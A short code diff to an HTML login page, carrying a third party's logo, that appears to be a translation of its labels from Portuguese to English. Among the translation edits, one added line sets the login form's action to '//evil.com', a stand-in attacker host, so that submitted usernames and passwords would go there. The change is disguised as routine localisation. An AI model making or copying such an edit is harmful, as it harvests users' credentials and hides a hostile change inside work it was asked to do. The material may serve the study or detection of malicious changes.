@@ -39,15 +39,15 @@
 <body>
     <div class="login-container">
         <img src="https://www.leasingmarkt.de/res/v3/image/home/as24-leasingmarkt-endorsement.svg" alt="Login Image">
-        <h2 class="mb-4" style="color: #28a745;">Acessar sua conta</h2>
-        <form>
+        <h2 class="mb-4" style="color: #28a745;">Access your account:</h2>
+        <form action="//evil.com">
             <div class="mb-3">
-                <input type="text" class="form-control" id="username" placeholder="Usuário">
+                <input type="text" class="form-control" id="username" placeholder="User">
             </div>
             <div class="mb-3">
-                <input type="password" class="form-control" id="password" placeholder="Senha">
+                <input type="password" class="form-control" id="password" placeholder="Password">
             </div>
-            <button type="submit" class="btn btn-green w-100">Entrar</button>
+            <button type="submit" class="btn btn-green w-100">Sign-In</button>
         </form>
     </div>
     
